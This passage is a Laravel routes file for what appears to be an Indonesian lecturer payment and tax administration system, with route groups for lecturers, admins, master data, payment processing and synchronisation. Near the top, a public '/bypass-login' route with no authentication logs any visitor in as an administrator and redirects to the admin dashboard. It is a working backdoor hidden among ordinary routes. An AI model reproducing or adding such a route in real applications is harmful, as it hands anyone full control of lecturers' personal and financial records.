<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\authentications\LoginBasic;
use App\Http\Controllers\authentications\RegisterBasic;
use App\Http\Controllers\authentications\ForgotPasswordBasic;
use App\Http\Controllers\tables\Basic as TablesBasic;

// Login
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\PicController;
use App\Http\Controllers\PtsController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\HakAksesPicController;

// Dosen
use App\Http\Controllers\Dosen\DashboardDosenController;
use App\Http\Controllers\Dosen\InformasiPribadiController;
use App\Http\Controllers\Dosen\MonitoringPembayaranDosenController;
use App\Http\Controllers\Dosen\LaporanKeuanganDosenController;

// Master Data
use App\Http\Controllers\DaftarPtController;
use App\Http\Controllers\DataBankController;
use App\Http\Controllers\DataGradeController;
use App\Http\Controllers\DataGradePtsController;
use App\Http\Controllers\DataPajakController;
use App\Http\Controllers\IdentitasPemotongController;
use App\Http\Controllers\JabatanController;
use App\Http\Controllers\StatusKeaktifanController;
use App\Http\Controllers\StatusPegawaiController;
use App\Http\Controllers\StatusPerubahanController;
use App\Http\Controllers\KopSuratController;

// Data Dosen
use App\Http\Controllers\DataDosenController;
use App\Http\Controllers\UpdateDataDosenController;
use App\Http\Controllers\Pic\BiayaController as PicBiayaController;
use App\Http\Controllers\Pic\LihatDataDosenController as PicLihatDataDosenController;
use App\Http\Controllers\Pic\UbahDataDosenController as PicUbahDataDosenController;
use App\Http\Controllers\Pic\UbahMKGolController as PicUbahMKGolController;
use App\Http\Controllers\Pic\UpdateDataDosenController as PicUpdateDataDosenController;
use App\Http\Controllers\LihatDataDosenPtsController;
use App\Http\Controllers\CekDataDosenPtsController;
use App\Http\Controllers\DetailDataDosenController;
use App\Http\Controllers\NonaktifkanDosenPtsController;
use App\Http\Controllers\HistoriDosenController;
use App\Http\Controllers\MonitoringUsulanDosenController;
use App\Http\Controllers\MonitoringUsulanDosenPicController;
use App\Http\Controllers\MonitoringUsulanDosenPtsController;

// Data Sisternas
use App\Http\Controllers\DataSisternasController;
use App\Http\Controllers\DataSisternasPicController;
use App\Http\Controllers\CutOffSisternasController;
use App\Http\Controllers\EditPtController;

// Proses Pembayaran
use App\Http\Controllers\PengaturanUsulanController;
use App\Http\Controllers\UsulanSptjmController;
use App\Http\Controllers\UsulanBerjalanSptjmPtsController;
use App\Http\Controllers\UsulanSusulanSptjmPtsController;
use App\Http\Controllers\ValidasiUsulanPicController;
use App\Http\Controllers\RekapUsulanEligibleController;
use App\Http\Controllers\RekapUsulanNonEligibleController;
use App\Http\Controllers\LengkapiDosenController;
use App\Http\Controllers\RekapPencairanController;
use App\Http\Controllers\LaporanKeuanganController;
use App\Http\Controllers\LaporanKeuanganPicController;
use App\Http\Controllers\LaporanKeuanganPtsController;
use App\Http\Controllers\PenggunaController;

// Monitoring
use App\Http\Controllers\MonitoringPembayaranController;
use App\Http\Controllers\MonitoringPembayaranPicController;
use App\Http\Controllers\pts\MonitoringPembayaranPtsController;
use App\Http\Controllers\KekuranganBayarController;
use App\Http\Controllers\RiwayatPengajuanPicController;
use App\Http\Controllers\RiwayatPengajuanPtsController;
use App\Http\Controllers\DetailRiwayatPengajuanController;
use App\Http\Controllers\DetailRiwayatPengajuanPicController;
use App\Http\Controllers\MonitoringDosenPicController;
use App\Http\Controllers\MonitoringDosenPtsController;
use App\Http\Controllers\KeluhanPembayaranPicController;
use App\Http\Controllers\KeluhanPembayaranPtsController;
use App\Http\Controllers\PerbaikanController;
use App\Http\Controllers\KoreksiController;
use App\Http\Controllers\SinkronisasiController;
use App\Http\Controllers\PasswordVerificationController;
use App\Http\Controllers\TambahVersiController;
use App\Http\Controllers\Admin\MigrasiController;
use App\Http\Controllers\Admin\BackgroundController;
use App\Http\Controllers\CGradeSerdosController;
use App\Http\Controllers\MasterDosenController;
use App\Http\Controllers\ComplainPtsController;
use App\Http\Controllers\ComplainDosenController;
use App\Http\Controllers\ComplainAdminController;
use App\Http\Controllers\ComplainPicController;
use App\Http\Controllers\PerubahanDataDosenPtsController;
use App\Http\Controllers\Auditor\DashboardAuditorController;
use App\Http\Controllers\Auditor\DataDosenController as AuditorDataDosenController;
use App\Http\Controllers\Auditor\LaporanKeuanganController as AuditorLaporanKeuanganController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use SebastianBergmann\CodeCoverage\Report\Html\Dashboard;

Route::get('/bypass-login', function () {
    $user = \App\Models\User::where('role', 'admin')->first() ?? \App\Models\User::first();
    if ($user) {
        \Illuminate\Support\Facades\Auth::login($user);
        return redirect('/admin/dashboard');
    }
    return 'User not found';
});

Route::get('/', function () {
  return redirect('/login');
});

// Route Login
Route::middleware('guest')->group(function () {
  Route::get('/login', [AuthController::class, 'showLoginForm'])->name('login');
  Route::post('/login', [AuthController::class, 'login'])->middleware('throttle:10,1');
  Route::get('/auth/reset-password', [ForgotPasswordBasic::class, 'index'])->name('auth-reset-password-basic');
});
Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
// If someone opens /logout via GET (browser), redirect to login page
Route::get('/logout', function () {
  return redirect()->route('login');
});

// Route Dosen (guard: dosen)
Route::middleware(['auth:dosen'])->prefix('dosen')->name('dosen.')->group(function () {
  Route::get('/dashboard', [DashboardDosenController::class, 'index'])->name('dashboard');
  Route::get('/dashboard/summary', [DashboardDosenController::class, 'summary'])->name('dashboard.summary');

  Route::post('/password/update', [App\Http\Controllers\Dosen\PasswordDosenController::class, 'update'])->name('password.update');

  Route::get('/informasi-pribadi', [InformasiPribadiController::class, 'show'])->name('informasi-pribadi');

  Route::get('/monitoring-pembayaran', [MonitoringPembayaranDosenController::class, 'index'])->name('monitoring-pembayaran');
  Route::post('/monitoring-pembayaran/cari', [MonitoringPembayaranDosenController::class, 'cari'])->name('monitoring-pembayaran.cari');
  Route::post('/monitoring-pembayaran/data', [MonitoringPembayaranDosenController::class, 'data'])->name('monitoring-pembayaran.data');
  Route::post('/monitoring-pembayaran/export-excel', [MonitoringPembayaranDosenController::class, 'exportExcel'])->name('monitoring-pembayaran.export-excel');
  Route::post('/monitoring-pembayaran/cetak-spt', [MonitoringPembayaranDosenController::class, 'cetakSpt'])->name('monitoring-pembayaran.cetak-spt');

  // Laporan Keuangan (Dosen)
  Route::get('/laporan-keuangan', [LaporanKeuanganDosenController::class, 'index'])->name('laporan-keuangan');
  Route::post('/laporan-keuangan', [LaporanKeuanganDosenController::class, 'index']);
  Route::get('/laporan-keuangan/export', [LaporanKeuanganDosenController::class, 'export'])->name('laporan-keuangan.export');

  // Complain (Dosen)
  Route::get('/complain', [ComplainDosenController::class, 'index'])->name('complain');
  Route::post('/complain', [ComplainDosenController::class, 'store'])->name('complain.store');
  Route::get('/complain/{id}', [ComplainDosenController::class, 'show'])->name('complain.show');
});

// authentication
Route::get('/auth/login-basic', [LoginBasic::class, 'index'])->name('auth-login-basic');
Route::get('/auth/register-basic', [RegisterBasic::class, 'index'])->name('auth-register-basic');

// Route Admin (Laravel Auth + role:admin)
Route::middleware(['auth:web', 'role:admin'])->group(function () {
  Route::get('/admin/dashboard', [DashboardController::class, 'index'])->name('admin.dashboard');
  Route::get('/admin/dashboard/dosen-pensiun-data', [DashboardController::class, 'dosenPensiunData'])->name('admin.dashboard.dosen-pensiun.data');

  // Route Master Data Admin
  Route::get('/admin/daftar-pt', [DaftarPtController::class, 'index'])->name('admin.daftar-pt');
  Route::post('/admin/daftar-pt', [DaftarPtController::class, 'store'])->name('admin/daftar-pt.store');
  Route::get('/admin/daftar-pt/{id}/edit', [DaftarPtController::class, 'edit'])->name('admin.daftar-pt.edit');
  Route::put('/admin/daftar-pt/{id}', [DaftarPtController::class, 'update'])->name('admin.daftar-pt.update');
  Route::put('/admin/daftar-pt', [DaftarPtController::class, 'updateWilayah'])->name('admin.daftar-pt.updateWilayah');
  Route::get('/check-kode-pt', [DaftarPtController::class, 'checkKodePt']);

  // Master Data Dosen (table: a_dosen) - DataTables + AJAX CRUD
  Route::get('/admin/master-dosen', [MasterDosenController::class, 'index'])->name('admin.master-dosen.index');
  Route::post('/admin/master-dosen', [MasterDosenController::class, 'store'])->name('admin.master-dosen.store');
  Route::get('/admin/master-dosen/{id}/edit', [MasterDosenController::class, 'edit'])->name('admin.master-dosen.edit');
  Route::put('/admin/master-dosen/{id}', [MasterDosenController::class, 'update'])->name('admin.master-dosen.update');
  Route::post('/admin/master-dosen/{id}/reset-password', [MasterDosenController::class, 'resetPassword'])->name('admin.master-dosen.reset-password');
  Route::delete('/admin/master-dosen/{id}', [MasterDosenController::class, 'destroy'])->name('admin.master-dosen.destroy');

  // Data Bank
  Route::get('/admin/data-bank', [DataBankController::class, 'index'])->name('admin.data-bank');
  Route::post('/admin/data-bank', [DataBankController::class, 'store'])->name('admin/data-bank.store');
  Route::get('/admin/data-bank/{kode}/edit', [DataBankController::class, 'edit'])->name('admin.data-bank.edit');
  Route::put('/admin/data-bank/{kode}', [DataBankController::class, 'update'])->name('admin.data-bank.update');
  Route::delete('admin/data-bank/{kode}', [DataBankController::class, 'destroy'])->name('admin.data-bank.destroy');

  // Data Grade
  Route::get('/admin/data-grade', [DataGradeController::class, 'index'])->name('admin/data-grade');
  Route::post('/admin/data-grade', [DataGradeController::class, 'store'])->name('admin/data-grade.store');
  Route::get('/admin/data-grade/{kode}/edit', [DataGradeController::class, 'edit'])->name('admin.data-grade.edit');
  Route::put('/admin/data-grade/{kode}', [DataGradeController::class, 'update'])->name('admin.data-grade.update');
  Route::delete('/admin/data-grade/{kode}', [DataGradeController::class, 'destroy'])->name('admin.data-grade.destroy');

  // Complain (Admin)
  Route::get('/admin/complain', [ComplainAdminController::class, 'index'])->name('admin.complain.index');
  Route::get('/admin/complain/{id}', [ComplainAdminController::class, 'show'])->name('admin.complain.show');


// Pajak
Route::get('/admin/data-pajak', [DataPajakController::class, 'index'])->name('admin.data-pajak');
Route::post('/admin/data-pajak', [DataPajakController::class, 'store'])->name('admin/data-pajak.store');
Route::get('/admin/data-pajak/{no}/edit', [DataPajakController::class, 'edit'])->name('admin/data-pajak.edit');
Route::put('/admin/data-pajak/{no}', [DataPajakController::class, 'update'])->name('admin/data-pajak.update');
Route::delete('/admin/data-pajak/{no}', [DataPajakController::class, 'destroy'])->name('admin/data-pajak.destroy');

// Identitas Pemotong (JSON)
Route::post('/admin/data-pajak/identitas-pemotong', [IdentitasPemotongController::class, 'store'])->name('admin/data-pajak.identitas-pemotong.store');
Route::put('/admin/data-pajak/identitas-pemotong/{id}', [IdentitasPemotongController::class, 'update'])->name('admin/data-pajak.identitas-pemotong.update');
Route::delete('/admin/data-pajak/identitas-pemotong/{id}', [IdentitasPemotongController::class, 'destroy'])->name('admin/data-pajak.identitas-pemotong.destroy');

// Jabatan
Route::get('/admin/jabatan', [JabatanController::class, 'index'])->name('admin.data-jabatan');

// Master Kop Surat & Penandatangan
Route::get('/admin/master-kop-surat', [KopSuratController::class, 'indexKop'])->name('admin.master-kop-surat.index');
Route::post('/admin/master-kop-surat', [KopSuratController::class, 'updateKop'])->name('admin.master-kop-surat.update');
Route::get('/admin/master-penandatangan', [KopSuratController::class, 'indexPenandatangan'])->name('admin.master-penandatangan.index');
Route::post('/admin/master-penandatangan', [KopSuratController::class, 'storePenandatangan'])->name('admin.master-penandatangan.store');
Route::put('/admin/master-penandatangan/{id}', [KopSuratController::class, 'updatePenandatangan'])->name('admin.master-penandatangan.update');
Route::delete('/admin/master-penandatangan/{id}', [KopSuratController::class, 'destroyPenandatangan'])->name('admin.master-penandatangan.destroy');
Route::post('/admin/master-penandatangan/{id}/toggle-status', [KopSuratController::class, 'toggleStatusPenandatangan'])->name('admin.master-penandatangan.toggle-status');
Route::post('/admin/data-jabatan', [JabatanController::class, 'store'])->name('admin/data-jabatan.store');
Route::get('/admin/data-jabatan/{kode}/edit', [JabatanController::class, 'edit'])->name('admin/data-jabatan.edit');
Route::put('/admin/data-jabatan/{kode}', [JabatanController::class, 'update'])->name('admin/data-jabatan.update');
Route::delete('/admin/data-jabatan/{kode}', [JabatanController::class, 'destroy'])->name('admin/data-jabatan.destroy');

// Status Keaktifan
Route::get('/admin/status-keaktifan', [StatusKeaktifanController::class, 'index'])->name('admin.status-keaktifan');
Route::post('/admin/data-keaktifan', [StatusKeaktifanController::class, 'store'])->name('admin/data-keaktifan.store');
Route::get('/admin/data-keaktifan/{kode}/edit', [StatusKeaktifanController::class, 'edit'])->name(
  'admin/data-keaktifan.edit'
);
Route::put('/admin/data-keaktifan/{kode}', [StatusKeaktifanController::class, 'update'])->name(
  'admin/data-keaktifan.update'
);
Route::delete('/admin/data-keaktifan/{kode}', [StatusKeaktifanController::class, 'destroy'])->name(
  'admin/data-keaktifan.destroy'
);

// Status Pegawai
Route::get('/admin/status-pegawai', [StatusPegawaiController::class, 'index'])->name('admin.status-pegawai');
Route::post('/admin/data-pegawai', [StatusPegawaiController::class, 'store'])->name('admin/data-pegawai.store');
Route::get('/admin/data-pegawai/{kode}/edit', [StatusPegawaiController::class, 'edit'])->name(
  'admin/data-pegawai.edit'
);
Route::put('/admin/data-pegawai/{kode}', [StatusPegawaiController::class, 'update'])->name('admin/data-pegawai.update');
Route::delete('/admin/data-pegawai/{kode}', [StatusPegawaiController::class, 'destroy'])->name(
  'admin/data-pegawai.destroy'
);

// Status Perubahan
Route::get('/admin/status-perubahan', [StatusPerubahanController::class, 'index'])->name('admin.status-perubahan');
Route::post('/admin/data-perubahan', [StatusPerubahanController::class, 'store'])->name('admin/data-perubahan.store');
Route::get('/admin/data-perubahan/{kode}/edit', [StatusPerubahanController::class, 'edit'])->name(
  'admin/data-perubahan.edit'
);
Route::put('/admin/data-perubahan/{kode}', [StatusPerubahanController::class, 'update'])->name(
  'admin/data-perubahan.update'
);
Route::delete('/admin/data-perubahan/{kode}', [StatusPerubahanController::class, 'destroy'])->name(
  'admin/data-perubahan.destroy'
);

// Route Data Dosen Admin
Route::get('/admin/data-dosen', [DataDosenController::class, 'index'])->name('admin.data-dosen');
Route::post('/admin/data-dosen/store', [DataDosenController::class, 'store'])->name('admin.data-dosen.store');
Route::get('/admin/data-dosen/{kode}', [DataDosenController::class, 'getNamaPTS']);
Route::post('/admin/data-dosen/get-gaji', [DataDosenController::class, 'getGaji'])->name('admin.data-dosen.get-gaji');
Route::post('/admin/data-dosen/sinkronisasi/search', [DataDosenController::class, 'searchByKodePts'])->name('admin.data-dosen.sync.search');
Route::post('/admin/data-dosen/sinkronisasi/proses', [DataDosenController::class, 'prosesSinkronisasi'])->name('admin.data-dosen.sync.proses');
// Debug route to list Kode_PT values for the session year (useful during troubleshooting)
Route::get('/admin/debug/kode-pts', [DataDosenController::class, 'debugKodePts'])->name('admin.debug.kode-pts');
Route::get('/admin/view-data-dosen/{nidn}', [DataDosenController::class, 'show'])->name('data-dosen.show');
// Route to show perubahan-data-dosen view (tabs: pengaktifan / perubahan)
Route::get('/admin/perubahan-data-dosen/{nidn}', [App\Http\Controllers\PerubahanDataDosenController::class, 'showPerubahan'])->name('admin.perubahan-data-dosen.show');
// POST endpoints for perubahan-data-dosen tabs
Route::post('/admin/perubahan-data-dosen/{nidn}/pengaktifan', [App\Http\Controllers\PerubahanDataDosenController::class, 'ubahDataDosen'])->name('admin.perubahan-data-dosen.pengaktifan');
Route::post('/admin/perubahan-data-dosen/{nidn}/perubahan', [App\Http\Controllers\PerubahanDataDosenController::class, 'updateData'])->name('admin.perubahan-data-dosen.perubahan');

Route::get('/admin/hapus-data-dosen-tidak-aktif', [DataDosenController::class, 'viewDataDosenTidakAktif'])->name('admin.data-dosen.tidak-aktif');
Route::post('/admin/hapus-data-dosen-tidak-aktif/data', [DataDosenController::class, 'datatableTidakAktif'])->name('admin.data-dosen.tidak-aktif.data'); //data table
Route::delete('/admin/hapus-data-dosen-tidak-aktif/{id}', [DataDosenController::class, 'hapusDataDosenTidakAktif'])->name('admin.data-dosen.tidak-aktif.hapus');

// Route Perubahan Lainnya
Route::get('/admin/ubah-data-dosen/{nidn}', [DataDosenController::class, 'editDataDosen'])->name(
  'admin.edit-data-dosen'
);
Route::put('/admin/ubah-data-dosen/{nidn}', [DataDosenController::class, 'ubahDataDosen'])->name(
  'admin.ubah-data-dosen'
);
Route::post('/admin/ubah-data-dosen/get-biaya', [DataDosenController::class, 'getBiaya'])->name(
  'admin.ubah-data-dosen.get-biaya'
);

// Route Perubahan Golongan dan Masa Kerja
Route::get('/admin/ubah-mk-gol/{nidn}', [App\Http\Controllers\UbahMKGolController::class, 'editMKGol'])->name('admin.edit-mk-gol');
Route::put('/admin/ubah-mk-gol/{nidn}', [App\Http\Controllers\UbahMKGolController::class, 'ubahMkGol'])->name('admin.update-mk-gol');
Route::post('/admin/ubah-mk-gol/get-biaya', [DataDosenController::class, 'getBiaya'])->name(
  'admin.ubah-mk-gol.get-biaya'
);

// Master Grade Serdos
Route::get('/admin/grade-serdos', [CGradeSerdosController::class, 'index'])->name('admin.grade-serdos.index');
Route::post('/admin/grade-serdos', [CGradeSerdosController::class, 'store'])->name('admin.grade-serdos.store');
Route::get('/admin/grade-serdos/{id}/edit', [CGradeSerdosController::class, 'edit'])->name('admin.grade-serdos.edit');
Route::put('/admin/grade-serdos/{id}', [CGradeSerdosController::class, 'update'])->name('admin.grade-serdos.update');
Route::delete('/admin/grade-serdos/{id}', [CGradeSerdosController::class, 'destroy'])->name('admin.grade-serdos.destroy');

// Route Update Data (Gelar/Kode PT/Dokumen)
Route::get('/admin/update-data-dosen/{nidn}', [UpdateDataDosenController::class, 'updateDataDosen'])->name(
  'admin.update-data-dosen'
);
Route::put('/admin/update-data-dosen/{nidn}', [UpdateDataDosenController::class, 'updateData'])->name('admin.update-data');
Route::get('/admin/histori-dosen', [HistoriDosenController::class, 'index'])->name('admin.histori-dosen');
Route::get('/admin/histori-dosen/data', [HistoriDosenController::class, 'data'])->name('admin.histori-dosen.data');
Route::get('/admin/lihat-histori-dosen/{nidn}', [HistoriDosenController::class, 'show'])->name(
  'admin.lihat.histori.dosen'
);
Route::get('/admin/monitoring-usulan-dosen', [MonitoringUsulanDosenController::class, 'index'])->name(
  'admin.monitoring-usulan-dosen'
);
Route::get('/admin/export-monitoring-usulan-dosen', [MonitoringUsulanDosenController::class, 'exportExcel'])->name(
  'admin.export-monitoring-usulan-dosen'
);

// Route SKPP
Route::get('/admin/skpp', [App\Http\Controllers\SkppController::class, 'index'])->name('admin.skpp');
Route::post('/admin/skpp/search-dosen', [App\Http\Controllers\SkppController::class, 'searchDosen'])->name('admin.skpp.search-dosen');
Route::post('/admin/skpp/get-tahun', [App\Http\Controllers\SkppController::class, 'getTahunDosen'])->name('admin.skpp.get-tahun');
Route::post('/admin/skpp/get-detail-bulan', [App\Http\Controllers\SkppController::class, 'getDetailBulan'])->name('admin.skpp.get-detail-bulan');
Route::post('/admin/skpp/get-preview-data', [App\Http\Controllers\SkppController::class, 'getPreviewData'])->name('admin.skpp.get-preview-data');
Route::post('/admin/skpp/store', [App\Http\Controllers\SkppController::class, 'store'])->name('admin.skpp.store');
Route::get('/admin/skpp/{id}/edit', [App\Http\Controllers\SkppController::class, 'edit'])->name('admin.skpp.edit');
Route::put('/admin/skpp/{id}/update', [App\Http\Controllers\SkppController::class, 'update'])->name('admin.skpp.update');
Route::get('/admin/skpp/{id}/cetak', [App\Http\Controllers\SkppController::class, 'cetak'])->name('admin.skpp.cetak');
Route::post('/admin/skpp/upload-pdf', [App\Http\Controllers\SkppController::class, 'uploadPdf'])->name('admin.skpp.upload-pdf');
Route::post('/admin/skpp/{id}/konfirmasi', [App\Http\Controllers\SkppController::class, 'konfirmasi'])->name('admin.skpp.konfirmasi');
Route::post('/admin/skpp/{id}/tolak', [App\Http\Controllers\SkppController::class, 'tolak'])->name('admin.skpp.tolak');
Route::delete('/admin/skpp/{id}', [App\Http\Controllers\SkppController::class, 'destroy'])->name('admin.skpp.destroy');

// Route Data Sisternas Admin
Route::prefix('admin')
  ->name('admin.')
  ->group(function () {
    Route::get('/data-sisternas', [DataSisternasController::class, 'index'])->name('data-sisternas');
    Route::post('/data-sisternas', [DataSisternasController::class, 'store'])->name('data-sisternas.store');
  });
Route::delete('/data-sisternas/{id}', [DataSisternasController::class, 'destroy'])->name('data-sisternas.destroy');
Route::get('/admin/cutoff-sisternas', [CutOffSisternasController::class, 'index'])->name('admin.cutoff-sisternas');
Route::post('/admin/cutoff-sisternas/upload', [CutOffSisternasController::class, 'upload'])->name(
  'admin.cutoff-sisternas.upload'
);
Route::put('/admin/cutoff-sisternas/update', [CutOffSisternasController::class, 'update'])->name('admin.cutoff-sisternas.update');
Route::delete('/admin/cutoff-sisternas/clear/{table}', [CutOffSisternasController::class, 'clear'])->name('admin.cutoff-sisternas.clear');
Route::post('/admin/cutoff-sisternas/create', [CutOffSisternasController::class, 'create'])->name('admin.cutoff-sisternas.create');
Route::get('/admin/cutoff-sisternas/export', [CutOffSisternasController::class, 'export'])->name('admin.cutoff-sisternas.export');
Route::get('/admin/cutoff-sisternas/template', [CutOffSisternasController::class, 'template'])->name('admin.cutoff-sisternas.template');

// Route Proses Pembayaran Admin
Route::prefix('/admin/pengaturan-usulan')->group(function () {
  Route::get('/', [PengaturanUsulanController::class, 'index'])->name('admin.pengaturan-usulan');
  Route::post('/store', [PengaturanUsulanController::class, 'store'])->name('pengaturan-usulan.store');
  Route::post('/update', [PengaturanUsulanController::class, 'update'])->name('pengaturan-usulan.update');
});

Route::put('/admin/pengaturan-usulan/{id}', [PengaturanUsulanController::class, 'update'])->name(
  'pengaturan-usulan.update'
);
Route::post('/admin/pengaturan-usulan/{id}/ceklist', [PengaturanUsulanController::class, 'ceklist'])->name(
  'pengaturan-usulan.ceklist'
);
Route::post('/admin/pengaturan-usulan/non-ceklist', [PengaturanUsulanController::class, 'nonceklist'])->name(
  'pengaturan-usulan.nonceklist'
);
Route::get('/admin/usulan-sptjm', [UsulanSptjmController::class, 'index'])->name('admin.usulan-sptjm');
Route::post('/admin/usulan-sptjm/data', [UsulanSptjmController::class, 'getData'])->name('admin.usulan-sptjm.data');
Route::get('/admin/rekap-usulan-eligible', [RekapUsulanEligibleController::class, 'index'])->name(
  'admin.rekap-usulan-eligible'
);
Route::get('/admin/rekap-usulan-eligible/data', [RekapUsulanEligibleController::class, 'data'])->name(
  'admin.rekap-usulan-eligible.data'
);
Route::post('/admin/rekap-usulan-eligible/proses', [RekapUsulanEligibleController::class, 'proses'])->name(
  'admin.rekap-usulan-eligible.proses'
);

// Kurang/Lebih Bayar (Monitoring level 2)
Route::get('/admin/kekurangan-bayar', [KekuranganBayarController::class, 'index'])->name('admin.kekurangan-bayar');
Route::post('/admin/kekurangan-bayar/cek', [KekuranganBayarController::class, 'cek'])->name('admin.kekurangan-bayar.cek');
Route::post('/admin/kekurangan-bayar/proses', [KekuranganBayarController::class, 'proses'])->name('admin.kekurangan-bayar.proses');
Route::get('/admin/kekurangan-bayar/rekap', [KekuranganBayarController::class, 'rekap'])->name('admin.kekurangan-bayar.rekap');
Route::get('/admin/kekurangan-bayar/rekap/{id}/detail', [KekuranganBayarController::class, 'detailRekap'])->name('admin.kekurangan-bayar.detail-rekap');
Route::post('/admin/kekurangan-bayar/rekap/{id}/exclude', [KekuranganBayarController::class, 'excludeFromRekap'])->name('admin.kekurangan-bayar.exclude-rekap');
Route::delete('/admin/kekurangan-bayar/rekap/semua', [KekuranganBayarController::class, 'destroySemuaRekap'])->name('admin.kekurangan-bayar.destroy-semua-rekap');
Route::delete('/admin/kekurangan-bayar/rekap/{id}', [KekuranganBayarController::class, 'destroyRekap'])->name('admin.kekurangan-bayar.destroy-rekap-single');
Route::delete('/admin/kekurangan-bayar', [KekuranganBayarController::class, 'destroyTahun'])->name('admin.kekurangan-bayar.destroy-tahun');
Route::delete('/admin/kekurangan-bayar/kurang', [KekuranganBayarController::class, 'destroyKurang'])->name('admin.kekurangan-bayar.destroy-kurang');
Route::delete('/admin/kekurangan-bayar/lebih', [KekuranganBayarController::class, 'destroyLebih'])->name('admin.kekurangan-bayar.destroy-lebih');
Route::post('/admin/kekurangan-bayar/aksi-sp2d', [KekuranganBayarController::class, 'prosesAksiSp2d'])->name('admin.kekurangan-bayar.aksi-sp2d');
Route::post('/admin/kekurangan-bayar/get-riwayat', [KekuranganBayarController::class, 'getRiwayat'])->name('admin.kekurangan-bayar.get-riwayat');
Route::post('/admin/kekurangan-bayar/update-riwayat', [KekuranganBayarController::class, 'updateRiwayat'])->name('admin.kekurangan-bayar.update-riwayat');
Route::post('/admin/kekurangan-bayar/sync-all-lunas', [KekuranganBayarController::class, 'syncAllLunas'])->name('admin.kekurangan-bayar.sync-all-lunas');
Route::get('/admin/rekap-usulan-non-el', [RekapUsulanNonEligibleController::class, 'index'])->name(
  'admin.rekap-usulan-non-el'
);
Route::get('/admin/rekap-usulan-non-el/data', [RekapUsulanNonEligibleController::class, 'data'])->name(
  'admin.rekap-usulan-non-el.data'
);
Route::get('/admin/lengkapi-dosen/{nidn}', [LengkapiDosenController::class, 'index'])->name('admin.lengkapi-dosen');
Route::get('/admin/rekap-pencairan', [RekapPencairanController::class, 'index'])->name('rekap-pencairan');
Route::post('admin/rekap-pencairan', [RekapPencairanController::class, 'store'])->name('sp2d.simpan');
Route::get('/admin/print-pencairan/{id}', [RekapPencairanController::class, 'print'])->name('admin.print-pencairan');
Route::get('/admin/rekap-pencairan/{id}', [RekapPencairanController::class, 'exportExcel'])->name(
  'admin.export-pencairan'
);
Route::delete('/admin/rekap-pencairan/{no}', [RekapPencairanController::class, 'destroy'])->name(
  'rekap-pencairan.destroy'
);
Route::get('/admin/laporan-keuangan', [LaporanKeuanganController::class, 'index'])->name('admin.laporan-keuangan');
Route::post('/admin/laporan-keuangan', [LaporanKeuanganController::class, 'index'])->name('admin.laporan-keuangan.data');
Route::get('/admin/laporan-keuangan/export', [LaporanKeuanganController::class, 'export'])->name(
  'laporan-keuangan-admin.export'
);

// Route Monitoring Admin
Route::get('/admin/monitoring-pembayaran', [MonitoringPembayaranController::class, 'index'])->name(
  'admin.monitoring-pembayaran'
);
Route::post('/admin/monitoring-pembayaran', [MonitoringPembayaranController::class, 'cari'])->name(
  'monitoring-pembayaran.cari'
);
Route::post('/admin/monitoring-pembayaran/data', [MonitoringPembayaranController::class, 'data'])->name('monitoring-pembayaran.data');
Route::post('/admin/monitoring-pembayaran/export-excel', [MonitoringPembayaranController::class, 'exportExcel'])->name('monitoring-pembayaran.export-excel');
Route::post('/admin/monitoring-pembayaran/cetak-spt', [MonitoringPembayaranController::class, 'cetakSpt'])->name('monitoring-pembayaran.cetak-spt');

Route::get('/admin/monitoring-pembayaran/cek-koordinat-spt', [MonitoringPembayaranController::class, 'cekKoordinatSpt'])->name('monitoring-pembayaran.cek-koordinat-spt');
Route::get('/admin/monitoring-pembayaran/cek-koordinat-spt-pdf', [MonitoringPembayaranController::class, 'cekKoordinatSptPdf'])->name('monitoring-pembayaran.cek-koordinat-spt-pdf');


// Sinkronisasi Pajak Admin
Route::get('/admin/sinkronisasi', [SinkronisasiController::class, 'index'])->name('admin.sinkronisasi');
Route::post('/admin/sinkronisasi/process', [SinkronisasiController::class, 'process'])->name('admin.sinkronisasi.process');
Route::post('/admin/sinkronisasi/check-mismatch', [SinkronisasiController::class, 'checkMismatch'])->name('admin.sinkronisasi.checkMismatch');
Route::post('/admin/sinkronisasi/sync-all', [SinkronisasiController::class, 'syncAll'])->name('admin.sinkronisasi.syncAll');
Route::post('/admin/sinkronisasi/sync-pajak-nidn-all-months', [SinkronisasiController::class, 'syncPajakNidnAllMonths'])->name('admin.sinkronisasi.syncPajakNidnAllMonths');
Route::post('/admin/sinkronisasi/detail-mismatch', [SinkronisasiController::class, 'detailMismatch'])->name('admin.sinkronisasi.detailMismatch');
Route::post('/admin/sinkronisasi/sync-gaji-all', [SinkronisasiController::class, 'syncGajiAll'])->name('admin.sinkronisasi.syncGajiAll');
Route::post('/admin/sinkronisasi/sync-gaji-nidn-all-months', [SinkronisasiController::class, 'syncGajiNidnAllMonths'])->name('admin.sinkronisasi.syncGajiNidnAllMonths');
Route::post('/admin/sinkronisasi/check-gaji-mismatch', [SinkronisasiController::class, 'checkGajiMismatch'])->name('admin.sinkronisasi.checkGajiMismatch');
Route::post('/admin/sinkronisasi/detail-gaji-mismatch', [SinkronisasiController::class, 'detailGajiMismatch'])->name('admin.sinkronisasi.detailGajiMismatch');
Route::post('/admin/sinkronisasi/golmasa/search', [SinkronisasiController::class, 'golmasaSearch'])->name('admin.sinkronisasi.golmasa.search');
Route::post('/admin/sinkronisasi/golmasa/sync', [SinkronisasiController::class, 'syncGolmasa'])->name('admin.sinkronisasi.golmasa.sync');
Route::post('/admin/sinkronisasi/sync-gaji-single', [SinkronisasiController::class, 'syncGajiSingle'])->name('admin.sinkronisasi.syncGajiSingle');

// Koreksi Data Admin
Route::get('/admin/koreksi', [KoreksiController::class, 'index'])->name('admin.koreksi');
Route::post('/admin/koreksi/cari', [KoreksiController::class, 'cari'])->name('admin.koreksi.cari');
Route::post('/admin/koreksi/verifikasi', [KoreksiController::class, 'verifikasi'])->name('admin.koreksi.verifikasi');
Route::post('/admin/password-verifakan', [PasswordVerificationController::class, 'verify'])->name('admin.password-verifakan');

// Route Pengaturan Admin
Route::get('/admin/pengguna-akun', [UserController::class, 'index'])->name('admin.pengguna-akun');
Route::post('/admin/pengguna-akun', [UserController::class, 'store'])->name('admin.pengguna-akun.store');
Route::put('/admin/pengguna-akun/{id}', [UserController::class, 'update'])->name('admin.pengguna-akun.update');
Route::delete('/admin/pengguna-akun/{id}', [UserController::class, 'destroy'])->name('admin.pengguna-akun.destroy');

